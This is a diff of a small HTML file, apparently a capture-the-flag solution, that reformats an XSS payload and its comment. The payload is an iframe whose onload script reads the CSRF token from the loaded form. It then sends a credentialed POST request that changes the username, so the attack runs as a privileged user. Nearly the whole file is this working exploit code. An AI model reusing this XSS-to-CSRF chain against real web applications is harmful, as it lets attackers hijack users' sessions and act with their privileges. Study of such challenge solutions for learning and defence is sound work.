@@ -1,11 +1,18 @@
 <!--
-Uses a XSS to perform a CSRF attack targeting a high privileged user.
-This is a part of challenge
+XSS/CSRF challenge thingie,
+has been formatted for convenience
+
+1. Load an external page (from the same origin)
+2. Fetch the CSRF token
+3. Execute a POST request using the CSRF token
 -->
-<iframe id="f" name="f" onload="var x=new XMLHttpRequest();x.open('POST', \
-            'http://origin/ctf/dat/csrf');x.setRequestHeader('Content-Type', \
-            'application/x-www-form-urlencoded');x.withCredentials=true; \
+<iframe id="f" onload=" \
+            var x=new XMLHttpRequest(); \
+            x.open('POST', 'http://origin/ctf/dat/csrf'); \
+            x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); \
+            x.withCredentials=true; \
             x.send('csrftoken='+ \ 
                    document.getElementById('f').contentDocument.forms[0].elements[0].value \
                    +'&username=maskis')" \ 
-            src="http://origin/ctf/dat/csrf"></iframe>
+            src="http://origin/ctf/dat/csrf">
+</iframe>
